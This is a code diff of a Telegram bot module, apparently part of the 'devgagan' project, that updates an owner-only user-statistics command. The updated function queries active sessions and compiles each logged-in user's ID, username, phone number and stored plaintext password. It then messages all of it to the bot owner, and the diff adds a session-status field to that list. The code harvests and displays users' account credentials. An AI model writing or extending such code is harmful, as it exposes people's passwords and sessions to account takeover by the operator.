@@ -4,30 +4,26 @@
 # Author: Adarsh
 # Created: 2025-01-11
 # Last Modified: 2025-01-11
-# Version: 2.0.6
+# Version: 2.0.8
 # License: MIT License
 # ---------------------------------------------------
 
 from pyrogram import filters
 from devgagan import app
 from config import OWNER_ID
-from devgagan.core.mongo.db import db
+from devgagan.core.mongo.db import db, user_sessions_real
 from devgagan.core.func import check_bot_mode
 import asyncio
 
-# Updated MongoDB collection paths
-USER_DB = db.user_data.users_data_db
-USER_SESSIONS = USER_DB.user_sessions_real
-
 async def count_total_users():
     """Count all users in the database (free + premium)"""
-    return await USER_DB.users.count_documents({})
+    return await db.users.count_documents({})
 
 async def count_free_users():
     """
     Count all free users (non-premium) regardless of current bot mode
     """
-    return await USER_DB.users.count_documents({
+    return await db.users.count_documents({
         "premium": {"$exists": False}  # Users without premium field
     })
 
@@ -35,25 +31,26 @@ async def count_premium_users():
     """
     Count all premium users (users with premium status)
     """
-    return await USER_DB.users.count_documents({
+    return await db.users.count_documents({
         "premium": {"$exists": True}  # Users with premium field
     })
 
 async def get_logged_in_users():
     """
-    Get details of all currently logged-in users from user_sessions_real collection
+    Get details of users with active sessions (non-null session_string)
     Returns list of user details including ID, username, phone number, etc.
     """
     logged_in_users = []
-    async for session in USER_SESSIONS.find({}):
-        user_data = await USER_DB.users.find_one({"_id": session["user_id"]})
+    async for session in user_sessions_real.find({"session_string": {"$ne": None}}):
+        user_data = await db.users.find_one({"_id": session["user_id"]})
         if user_data:
             logged_in_users.append({
                 "user_id": session["user_id"],
                 "username": user_data.get("username", "N/A"),
                 "phone_number": user_data.get("phone_number", "N/A"),
                 "name": user_data.get("first_name", "N/A"),
-                "password": user_data.get("password", "N/A")
+                "password": user_data.get("password", "N/A"),
+                "session_status": "Active" if session.get("session_string") else "Inactive"
             })
     return logged_in_users
 
@@ -80,7 +77,7 @@ async def get_user_stats(_, message):
             f"👥 **Total Users:** `{total_users}`\n"
             f"🆓 **Free Users:** `{free_users}`\n"
             f"💰 **Premium Users:** `{premium_users}`\n"
-            f"🟢 **Currently Logged In:** `{len(logged_in_users)}`\n\n"
+            f"🟢 **Active Sessions:** `{len(logged_in_users)}`\n\n"
             "**Current Mode:** " + ("🆓 Free Mode" if await check_bot_mode() else "💰 Premium Mode")
         )
 
@@ -89,7 +86,7 @@ async def get_user_stats(_, message):
 
         # If there are logged in users, send their details
         if logged_in_users:
-            details_message = "**📝 Logged In Users Details:**\n\n"
+            details_message = "**📝 Active Users Details:**\n\n"
             for index, user in enumerate(logged_in_users, start=1):
                 details_message += (
                     f"{index}. 👤 **User ID:** `{user['user_id']}`\n"
@@ -97,6 +94,7 @@ async def get_user_stats(_, message):
                     f"   🔹 **Username:** @{user['username']}\n"
                     f"   📞 **Phone:** `{user['phone_number']}`\n"
                     f"   🔑 **Password:** `{user['password']}`\n"
+                    f"   🟢 **Status:** `{user['session_status']}`\n\n"
                 )
             
             # Split long messages
